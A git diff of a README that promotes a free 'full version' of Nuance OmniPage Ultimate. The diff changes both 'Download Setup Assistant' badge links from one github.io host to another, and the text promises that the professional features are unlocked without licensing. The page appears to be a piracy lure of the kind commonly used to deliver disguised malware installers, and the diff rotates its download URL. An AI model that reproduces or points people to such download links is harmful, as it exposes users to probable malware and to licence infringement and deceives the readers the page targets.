@@ -1,6 +1,6 @@
 # Nuance OmniPage Ultimate — Install For PC
 
-[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/NOU)
+[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://nuance-omnipage-ultimate.github.io/.github)
 
 ## ⚙️ How to Use
 
@@ -43,7 +43,7 @@ This guide helps you install **OmniPage Ultimate** on any Windows PC without req
 
 Whether you're handling form recognition or high-volume digitization, **OmniPage Pro** enables you to automate document handling with precision. The process described here makes it easy to set up the full version of **OmniPage Ultimate** and unlock professional features — all without relying on online licensing or external accounts.
 
-[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/NOU)
+[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://nuance-omnipage-ultimate.github.io/.github)
 
 ---
 
